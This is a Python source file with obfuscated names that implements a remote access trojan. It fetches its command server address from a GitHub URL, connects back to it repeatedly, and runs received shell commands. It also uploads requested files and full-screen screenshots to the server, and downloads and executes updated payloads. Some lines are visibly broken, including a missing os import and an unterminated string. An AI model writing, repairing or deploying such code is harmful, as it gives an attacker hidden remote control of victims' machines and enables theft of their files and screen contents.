import sys,subprocess,socket,time,requests
from PIL import ImageGrab
RKHSHCQLUbTdekzG = "04.12.24.9"
TwEYlbCH = ""
YRGrTOygFOPuOkOtURFV = ""
qLsErifDLbXaw = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
pCqlaVbxozloUvZyMZyTFK = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
TWrxZxzjgWngCPd = "!"
def HgLGXhSQjSeWeDcKafShnwz(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def kkpzXBiYadKhw(s):
	CEGRRGxaR = s.recv(1024)
	if len(CEGRRGxaR)==0:
		return True
	fwQdXtYnmODwLMqyyeJqmMV = CEGRRGxaR.decode("utf-8")
	if not fwQdXtYnmODwLMqyyeJqmMV.startswith(TWrxZxzjgWngCPd):
		proc = subprocess.run(fwQdXtYnmODwLMqyyeJqmMV, shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	UFuBvsvDGvtvp = fwQdXtYnmODwLMqyyeJqmMV.split(" ")[0][1:]
	if UFuBvsvDGvtvp == "download":
		rFNaaiSouMSV(s, fwQdXtYnmODwLMqyyeJqmMV)
	elif UFuBvsvDGvtvp == "screenshot":
		kxFBNLVOeqmEnSyqPFl(s)
def rFNaaiSouMSV(s, fwQdXtYnmODwLMqyyeJqmMV):
	GHgqDNLgpLKrPeGXqrEszh = fwQdXtYnmODwLMqyyeJqmMV.replace(TWrxZxzjgWngCPd+"download ","").split(",")
	results = []
	for f in GHgqDNLgpLKrPeGXqrEszh:
		results += gejpzgPDgEOGnqlicyzof(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes("\n".join(results), "utf-8"))
def kxFBNLVOeqmEnSyqPFl(fwQdXtYnmODwLMqyyeJqmMV):
	cZXVckiRIRvYEfoLsiaZO = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	cZXVckiRIRvYEfoLsiaZO.save(fpath)
	cZXVckiRIRvYEfoLsiaZO.close()
	r = gejpzgPDgEOGnqlicyzof(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def gejpzgPDgEOGnqlicyzof(alUSCXMETvNZkiRETBpShS, IclwoLZxC, BLemrKYVUPgrNvFqnOOlDv=None):
	if not os.path.exists(alUSCXMETvNZkiRETBpShS):
		return "[!] NOT FOUND: "+alUSCXMETvNZkiRETBpShS+"\n"
	headers = {"user":os.getlogin()}
	if BLemrKYVUPgrNvFqnOOlDv is not None:
		headers = {**headers, **BLemrKYVUPgrNvFqnOOlDv}
	requests.post(TwEYlbCH+":"+YRGrTOygFOPuOkOtURFV+"/"+IclwoLZxC,
		files={open(alUSCXMETvNZkiRETBpShS, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+alUSCXMETvNZkiRETBpShS+"\n"
def hySihvLGkJnHyBucu():
	if TwEYlbCH == "" or YRGrTOygFOPuOkOtURFV == "":
		CEGRRGxaR = requests.get(qLsErifDLbXaw).text.replace("\n","").split(":")
		TwEYlbCH = CEGRRGxaR[0].strip()
		YRGrTOygFOPuOkOtURFV = CEGRRGxaR[1].strip()
		trbGSfJJes = CEGRRGxaR[2].strip()
	return TwEYlbCH, YRGrTOygFOPuOkOtURFV, trbGSfJJes
def igQJzUtiAz():
	cLGmBGPau = os.path.basename(__file__)
	fileType = cLGmBGPau.split(".")[-1]
	pmuolSzzLaT = cLGmBGPau.replace(fileType,"") +"."+RKHSHCQLUbTdekzG + fileType
	nuNttSgNF = os.path.join(os.path.getcwd(), pmuolSzzLaT)
	with open(pmuolSzzLaT, "wb+") as f:
		f.write(requests.get(pCqlaVbxozloUvZyMZyTFK+"/file"+nuNttSgNF.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+nuNttSgNF)
	elif fileType == ".pyw":
		os.system("python "+nuNttSgNF")
def pGLYXpqgiTjSpZNgZTJ():
	pass
def hqSgesGrqfBqalcSLjQ():
	h, p, v = hySihvLGkJnHyBucu()
	if RKHSHCQLUbTdekzG != v:
		igQJzUtiAz()
	pGLYXpqgiTjSpZNgZTJ()
	DTxaZeUAHfKbZzVJVLEz = bytes("["+RKHSHCQLUbTdekzG+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				rEItVvuJoGXXDUCO=False
				try:
					s=HgLGXhSQjSeWeDcKafShnwz(h, p)
					while not rEItVvuJoGXXDUCO:
						s.send(DTxaZeUAHfKbZzVJVLEz)
						rEItVvuJoGXXDUCO=kkpzXBiYadKhw(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(hqSgesGrqfBqalcSLjQ())
